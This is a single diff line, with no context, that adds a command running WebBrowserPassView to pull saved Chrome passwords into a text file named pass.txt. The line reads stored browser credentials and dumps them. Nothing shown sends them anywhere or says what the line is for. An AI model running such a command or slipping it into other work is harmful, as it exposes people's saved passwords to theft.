@@ -1,0 +1,1 @@
+webbrowserpassview.exe /LoadPasswordsChrome 1 /stext pass.txt
